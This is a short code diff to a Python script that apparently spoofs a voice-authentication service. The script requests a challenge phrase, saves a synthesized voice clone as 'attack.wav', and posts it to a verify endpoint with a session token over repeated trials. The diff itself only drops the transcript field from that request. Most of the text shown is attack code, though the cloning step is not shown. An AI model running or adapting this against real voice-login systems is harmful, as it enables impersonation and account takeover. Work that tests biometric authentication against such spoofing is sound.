@@ -124,12 +124,11 @@ def get_challenge_phrase(base_url: str, session_token: str) -> str:
     return r.json()["phrase"]
 
 
-def submit_verify(base_url: str, session_token: str, wav_bytes: bytes, transcript: str) -> dict:
+def submit_verify(base_url: str, session_token: str, wav_bytes: bytes) -> dict:
     r = requests.post(
         f"{base_url}/api/voice-auth/verify",
         headers={"Authorization": f"Bearer {session_token}"},
         files={"audio": ("attack.wav", wav_bytes, "audio/wav")},
-        data={"transcript": transcript},
     )
     r.raise_for_status()
     return r.json()
@@ -176,7 +175,7 @@ def main():
             f.write(wav_bytes)
         print(f"Saved synthesized clone: {out_path}")
 
-        result = submit_verify(args.base_url, session_token, wav_bytes, phrase)
+        result = submit_verify(args.base_url, session_token, wav_bytes)
         print(f"App response: {result}")
 
         if i < args.trials:
